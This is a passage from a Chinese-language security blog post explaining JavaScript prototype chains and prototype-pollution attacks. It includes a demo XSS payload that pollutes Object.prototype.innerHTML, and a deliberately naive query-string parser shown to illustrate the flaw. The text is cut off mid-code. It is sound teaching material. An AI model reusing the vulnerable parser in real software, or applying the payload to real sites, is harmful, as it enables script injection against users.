<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="zh-tw">
<head>
    <meta charset="utf-8">
<title>基於 JS 原型鏈的攻擊手法：Prototype Pollution - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="google-adsense-account" content="ca-pub-1121865251398741">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1121865251398741"
     crossorigin="anonymous"></script>


            
<link href="https://blog.huli.tw/2021/09/29/en/prototype-pollution/" rel="alternate" hreflang="en" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2021/09/29/prototype-pollution/">
    





    <meta name="description" content="前言 身為一個前端工程師，或是一個會寫 JavaScript 的人，你一定多少有聽過 prototype 這個名詞，甚至面試的時候也會考到相關的題目。 但你可能沒聽過的是，在 JavaScript 中有一種攻擊手法跟原型鏈息息相關，利用原型鏈這個功能的特性來進行攻擊——Prototype pollution，通常翻做原型鏈污染，就是這麼有趣而且破壞力十足的一個攻擊手法。">
<meta property="og:type" content="article">
<meta property="og:title" content="基於 JS 原型鏈的攻擊手法：Prototype Pollution">
<meta property="og:url" content="https://blog.huli.tw/2021/09/29/prototype-pollution/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="前言 身為一個前端工程師，或是一個會寫 JavaScript 的人，你一定多少有聽過 prototype 這個名詞，甚至面試的時候也會考到相關的題目。 但你可能沒聽過的是，在 JavaScript 中有一種攻擊手法跟原型鏈息息相關，利用原型鏈這個功能的特性來進行攻擊——Prototype pollution，通常翻做原型鏈污染，就是這麼有趣而且破壞力十足的一個攻擊手法。">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://blog.huli.tw/img/prototype-pollution/1-repeat.png">
<meta property="og:image" content="https://blog.huli.tw/img/prototype-pollution/2-search.png">
<meta property="article:published_time" content="2021-09-28T16:00:00.000Z">
<meta property="article:modified_time" content="2023-05-07T01:15:16.487Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Front-end">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/prototype-pollution/1-repeat.png">



<link rel="alternative" href="/atom.xml" title="基於 JS 原型鏈的攻擊手法：Prototype Pollution" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">文章列表</a>
            
            <a class="navbar-item "
               href="/categories">分類</a>
            
            <a class="navbar-item "
               href="/recommend">推薦閱讀</a>
            
            <a class="navbar-item "
               href="/about">關於我</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="目錄">
                    目錄
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#前言">1&nbsp;&nbsp;<b>前言</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#原型鏈">2&nbsp;&nbsp;<b>原型鏈</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#改變預設-prototype-上的屬性">3&nbsp;&nbsp;<b>改變預設 prototype 上的屬性</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#污染了屬性以後可以幹嘛">4&nbsp;&nbsp;<b>污染了屬性以後可以幹嘛？</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#prototype-pollution-是怎麼發生的">5&nbsp;&nbsp;<b>Prototype pollution 是怎麼發生的？</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#prototype-pollution-script-gadgets">6&nbsp;&nbsp;<b>Prototype pollution script gadgets</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#中場總結">7&nbsp;&nbsp;<b>中場總結</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#該如何防禦">8&nbsp;&nbsp;<b>該如何防禦</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#實際案例">9&nbsp;&nbsp;<b>實際案例</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#結語">10&nbsp;&nbsp;<b>結語</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
                
                <i class="fab fa-medium"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
                
                <i class="fab fa-facebook"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
                <a class="navbar-item" href="/2021/09/29/en/prototype-pollution/">English</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            基於 JS 原型鏈的攻擊手法：Prototype Pollution
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2021-09-28T16:00:00.000Z" itemprop="datePublished">2021年9月29日</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/Security/">Security</a>
        </span>
        
        
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <h2><span id="前言">前言</span></h2><!-- summary -->
<p>身為一個前端工程師，或是一個會寫 JavaScript 的人，你一定多少有聽過 prototype 這個名詞，甚至面試的時候也會考到相關的題目。</p>
<p>但你可能沒聽過的是，在 JavaScript 中有一種攻擊手法跟原型鏈息息相關，利用原型鏈這個功能的特性來進行攻擊——Prototype pollution，通常翻做原型鏈污染，就是這麼有趣而且破壞力十足的一個攻擊手法。</p>
<!-- summary -->

<span id="more"></span>


<h2><span id="原型鏈">原型鏈</span></h2><p>JavaScript 中的物件導向跟其他程式語言比較不一樣，你現在看到的 <code>class</code> 那是 ES6 以後才有的語法，在這之前都是用 <code>prototype</code> 來做這件事情，又稱為原型繼承。</p>
<p>舉個例子好了，你有沒有想過當你在用一些內建函式的時候，這些函式是從哪裡來的？</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">"a"</span>
<span class="token keyword">var</span> str2 <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment">// repeat 是哪裡來的？</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>甚至你會發現，兩個不同字串的 repeat 方法，其實是同一個 function：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">"a"</span>
<span class="token keyword">var</span> str2 <span class="token operator">=</span> <span class="token string">"b"</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>repeat <span class="token operator">===</span> str2<span class="token punctuation">.</span>repeat<span class="token punctuation">)</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>或是如果你曾經查過 MDN，會發現標題不是 repeat，而是 <code>String.prototype.repeat</code>：</p>
<p><img src="/img/prototype-pollution/1-repeat.png" alt="string.prototype.repeat"></p>
<p>而這一切的一切，都與 prototype 有關。</p>
<p>當你在呼叫 <code>str.repeat</code> 的時候，並不是 str 這個 instance 上面真的有一個方法叫做 repeat，那既然如此，JS 引擎背後是怎麼運作的？</p>
<p>還記得 scope 的概念嗎？假設我用了一個變數，local scope 找不到，JS 引擎就會去上一層 scope 找，然後一路找到 global scope 為止，這又稱為 scope chain，JS 引擎沿著這條鏈不斷往上尋找，直到最頂端才停下來。</p>
<p>Prototype chain 的概念其實是一模一樣的，但差別在於：「JS 引擎怎麼知道上一層是哪裡？」，如果 JS 引擎在 <code>str</code> 身上找不到 repeat 這個 function，那它該去哪裡找呢？</p>
<p>在 JS 中有一個隱藏的屬性，叫做 <code>__proto__</code>，它儲存的值就是 JS 引擎應該往上找的地方。</p>
<p>例如說：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">""</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span> <span class="token comment">// String.prototype</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>str.__proto__</code> 所指向的東西，就是 JS 引擎在 str 身上找不到東西時，應該去的「上一層」，而這個上一層會是 <code>String.prototype</code>。</p>
<p>這解釋了為什麼 MDN 上面不寫 repeat，而是寫 <code>String.prototype.repeat</code>，因為這才是 repeat function 的全名，這個 repeat 函式其實是存在於 <code>String.prototype</code> 這個物件上的一個方法。</p>
<p>因此，當你在呼叫 <code>str.repeat</code> 的時候，其實就是在呼叫 <code>String.prototype.repeat</code>，而這就是原型鏈的原理跟運作方式。</p>
<p>除了字串以外，其他東西也是一樣的，例如說物件：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// undefined</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>toString<span class="token punctuation">)</span> <span class="token comment">// ƒ toString() &#123; [native code] &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>明明 obj 就是一個空物件，為什麼 <code>obj.toString</code> 有東西？因為 JS 引擎在 obj 找不到，所以就去 <code>obj.__proto__</code> 找，而這個 <code>obj.__proto__</code> 所指向的地方是 <code>Object.prototype</code>，所以 <code>obj.toString</code> 最後找到的其實是 <code>Object.prototype.toString</code>。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>toString <span class="token operator">===</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">)</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2><span id="改變預設-prototype-上的屬性">改變預設 prototype 上的屬性</span></h2><p>字串的 <code>__proto__</code> 會是 <code>String.prototype</code>，數字的 <code>__proto__</code> 會是 <code>Number.prototype</code>，而陣列的則是 <code>Array.prototype</code>，這些關聯都是已經預設好的了，原因就是要讓這些類別的東西可以共用同一個 function。</p>
<p>如果每一個字串都有自己的 <code>repeat</code>，那一百萬個字串就有一百萬個不同的 repeat，但其實做的事情都一樣，聽起來不太合理對吧？所以透過 prototype ，我們就可以把 <code>repeat</code> 放在 <code>String.prototype</code>，這樣每個字串在使用這個函式時，呼叫到的都會是同一個函式。</p>
<p>你可能會好奇說，既然呼叫到的是同個函式，參數也都一樣，那函式要怎麼區分出是不同的字串在呼叫它？</p>
<p>答案就是：this，底下直接看個例子：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">first</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span><span class="token function">first</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// undefined</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">.</span><span class="token function">first</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先，我在 <code>String.prototype</code> 上面加了一個方法叫做 <code>first</code>，所以當我呼叫 <code>&quot;&quot;.first</code> 的時候，JS 引擎沿著 <code>__proto__</code> 找到了 <code>String.prototype</code>，發現了 <code>String.prototype.first</code> 是存在的，就呼叫了這個函式。</p>
<p>而又因為 this 的規則，當 <code>&quot;&quot;.first()</code> 這樣寫的時候，在 <code>first</code> 中拿到的 this 會是 <code>&quot;&quot;</code>；若呼叫的是 <code>&quot;abc&quot;.first()</code>，<code>first</code> 中拿到的 this 就會是 <code>&quot;abc&quot;</code>，因此我們可以用 this 來區分現在是誰在呼叫。</p>
<p>像上面那樣 <code>String.prototype.first</code> 的寫法，就是直接去修改 String 的原型，加上一個新的方法，讓所有字串都可以用到這個新的 method。雖然很方便沒錯，但是這樣的方式在開發上是不被推薦的，有一句話是這樣說的：<a target="_blank" rel="noopener" href="https://humanwhocodes.com/blog/2010/03/02/maintainable-javascript-dont-modify-objects-you-down-own/">Don’t modify objects you don’t own</a>。例如說 MooTools 就因為做了類似的事情，導致一個 array 的 method 要換名稱，詳情請看我以前寫過的：<a href="https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/">Don’t break the Web：以 SmooshGate 以及 <keygen> 為例</a>。</p>
<p>然後，既然 <code>String.prototype</code> 可以修改，那理所當然 <code>Object.prototype</code> 也可以修改，像是這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">123</span>
<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// 123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>因為修改了 <code>Object.prototype</code> 的緣故，所以在存取 <code>obj.a</code> 的時候，JS 引擎在 obj 身上找不到 a 這個屬性，於是去 <code>obj.__proto__</code> 也就是 <code>Object.prototype</code> 找，在那上面找到了 a，於是就回傳這個 a 的值。</p>
<p>當程式出現漏洞，導致可以被攻擊者拿去改變原型鏈上的屬性，就叫做 prototype pollution。Pollution 是污染的意思，就像上面這個 object 的例子，我們透過 <code>Object.prototype.a = 123</code> 「污染」了物件原型上的 <code>a</code> 這個屬性，導致程式在存取物件時，有可能出現意想不到的行為。</p>
<p>那這會造成什麼後果呢？</p>
<h2><span id="污染了屬性以後可以幹嘛">污染了屬性以後可以幹嘛？</span></h2><p>假設今天網站上有個搜尋功能，會從 query string 裡面拿 <code>q</code> 的值，然後寫到畫面上去，呈現出來像是這樣：</p>
<p><img src="/img/prototype-pollution/2-search.png" alt="search"></p>
<p>而整段程式碼是這樣寫的：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 從網址列上拿到 query string</span>
<span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">// 放上畫面，為了避免 XSS 用 innerText</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">tag</span><span class="token operator">:</span> <span class="token string">'h2'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">innerText</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Search result for </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>qs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">// 簡化建立元件用的函式</span>
<span class="token keyword">function</span> <span class="token function">createElement</span><span class="token punctuation">(</span><span class="token parameter">config</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>tag<span class="token punctuation">)</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    element<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> config<span class="token punctuation">.</span>innerHTML
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> config<span class="token punctuation">.</span>innerText
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> element
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面這段程式碼應該沒什麼問題對吧？我們寫了一個 function <code>createElement</code> 幫我們簡化一些步驟，根據傳進來的 config 決定要產生什麼元件。為了避免 XSS，所以我們用 <code>innerText</code> 而不是 <code>innerHTML</code>，萬無一失，絕對不會有 XSS！</p>
<p>看起來是這樣沒錯，但如果在執行到這一段程式碼以前有個 prototype pollution 的漏洞，能讓攻擊者污染到原型上的屬性呢？例如說像是這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 先假設可以污染原型上的屬性</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;img src=x onerror=alert(1)>'</span>

<span class="token comment">// 底下都跟剛剛一樣</span>
<span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">tag</span><span class="token operator">:</span> <span class="token string">'h2'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">innerText</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Search result for </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>qs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">function</span> <span class="token function">createElement</span><span class="token punctuation">(</span><span class="token parameter">config</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>tag<span class="token punctuation">)</span>
  <span class="token comment">// 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    element<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> config<span class="token punctuation">.</span>innerHTML
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> config<span class="token punctuation">.</span>innerText
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> element
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>整份程式碼只差在開頭，多了一個 <code>Object.prototype.innerHTML = &#39;&lt;img src=x onerror=alert(1)&gt;&#39;</code>，而就因為這一行污染了 innerHTML，導致底下 <code>if (config.innerHTML) &#123;</code> 的判斷變成 true，行為被改變，原本是用 <code>innerText</code>，現在改成用 <code>innerHTML</code>，最後就達成了 XSS！</p>
<p>這就是由 prototype pollution 所引發的 XSS 攻擊。一般來說，prototype pollution 指的是程式有漏洞，導致攻擊者可以污染原型鏈上的屬性，但是除了污染以外，還必須找到可以影響的地方，加在一起才能形成完整的攻擊。</p>
<p>此時的你應該很好奇，那到底怎樣的程式碼會有漏洞，居然能讓攻擊者去改原型鏈上的屬性。</p>
<h2><span id="prototype-pollution-是怎麼發生的">Prototype pollution 是怎麼發生的？</span></h2><p>有兩個例子很常發生這種事情，第一個是解析 query string。</p>
<p>你可能想說 query string 不就 <code>?a=1&amp;b=2</code> 這種類型，有什麼難的？但其實許多函式庫的 query string 都有支援陣列，像是 <code>?a=1&amp;a=2</code> 或是 <code>?a[]=1&amp;a[]=2</code> 都有可能被解析為陣列。</p>
<p>除了陣列以外，有些甚至還支援物件，像是這樣：<code>?a[b][c]=1</code>，就會產生一個 <code>&#123;a: &#123;b: &#123;c: 1&#125;&#125;&#125;</code> 的物件出來。</p>
<p>舉例來說，<a target="_blank" rel="noopener" href="https://github.com/ljharb/qs#parsing-objects">qs</a> 這個 library 就有支援物件的解析。</p>
<p>今天如果是你要來負責這個功能，你會怎麼寫呢？我們可以寫一個只針對物件的陽春版本（先不考慮 URL encode 的情況，也不考慮陣列）：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">parseQs</span><span class="token punctuation">(</span><span class="token parameter">qs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
  <span class="token keyword">let</span> arr <span class="token operator">=</span> qs<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">of</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token operator">=</span> item<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>key<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// 針對一般的 key=value</span>
      result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
      <span class="token keyword">continue</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 針對物件</span>
    <span class="token keyword">let</span> items <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span>
    <span class="token keyword">let</span> obj <span class="token operator">=</span> result
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> items<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">let</span> objKey <span class="token operator">=</span> items<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">]$</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> items<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span> <span class="token operator">=</span> value
      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
